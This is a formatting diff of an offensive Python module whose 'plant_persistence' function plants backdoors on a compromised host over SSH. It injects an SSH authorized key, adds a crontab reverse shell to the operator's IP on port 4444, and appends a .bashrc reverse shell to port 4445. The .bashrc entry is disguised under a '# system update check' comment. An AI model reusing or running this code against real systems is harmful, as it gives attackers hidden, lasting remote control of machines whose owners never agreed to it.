@@ -15,21 +15,26 @@ try:
     from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
-    def find_wordlist(cat): return ""
-    def find_all_wordlists(cat): return []
+
+    def find_wordlist(cat):
+        return ""
+
+    def find_all_wordlists(cat):
+        return []
+
 
 from core.execution.policy import normalize_host
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
-C_GREEN  = "\033[92m"
+C_GREEN = "\033[92m"
 C_YELLOW = "\033[93m"
-C_RED    = "\033[91m"
-C_CYAN   = "\033[96m"
-C_GREY   = "\033[90m"
-C_BLUE   = "\033[94m"
+C_RED = "\033[91m"
+C_CYAN = "\033[96m"
+C_GREY = "\033[90m"
+C_BLUE = "\033[94m"
 C_MAGENTA = "\033[95m"
-C_RESET  = "\033[0m"
+C_RESET = "\033[0m"
 
 
 # PARAMIKO SSH HELPERS (shared across stages)
@@ -70,9 +75,10 @@ def plant_persistence(
 
         # ── METHOD 1: SSH Key Injection ──────────────────────────
         print(f"    {C_CYAN}[*] Injecting SSH authorized_key...{C_RESET}")
-        
+
         try:
             from core.opsec.artifact_mgr import ArtifactManager
+
             am = ArtifactManager(host)
         except ImportError:
             am = None
@@ -83,7 +89,8 @@ def plant_persistence(
             try:
                 subprocess.run(
                     ["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", "", "-q", "-C", "octopus"],
-                    check=True, timeout=10
+                    check=True,
+                    timeout=10,
                 )
             except Exception:
                 # Fallback: generate via paramiko
@@ -131,7 +138,9 @@ def plant_persistence(
             # Add to crontab without overwriting
             existing_cron = _ssh_exec(client, "crontab -l 2>/dev/null", timeout=5)
             if "octopus" not in existing_cron and "/dev/tcp" not in existing_cron:
-                _ssh_exec(client, f'(crontab -l 2>/dev/null; echo "# octopus"; echo "{cron_cmd}") | crontab -', timeout=10)
+                _ssh_exec(
+                    client, f'(crontab -l 2>/dev/null; echo "# octopus"; echo "{cron_cmd}") | crontab -', timeout=10
+                )
                 verify = _ssh_exec(client, "crontab -l 2>/dev/null | grep octopus", timeout=5)
                 if "octopus" in verify:
                     persistence_methods.append(f"Crontab reverse shell → {our_ip}:4444 every 5min")
@@ -159,7 +168,9 @@ def plant_persistence(
 
         # ── METHOD 4: .bashrc backdoor ───────────────────────────
         print(f"    {C_CYAN}[*] Adding .bashrc persistence...{C_RESET}")
-        bashrc_payload = f"\n# system update check\n(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null\n" if our_ip else ""
+        bashrc_payload = (
+            f"\n# system update check\n(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null\n" if our_ip else ""
+        )
         if bashrc_payload:
             existing = _ssh_exec(client, "cat ~/.bashrc 2>/dev/null | grep 'system update check'", timeout=5)
             if "system update" not in existing:
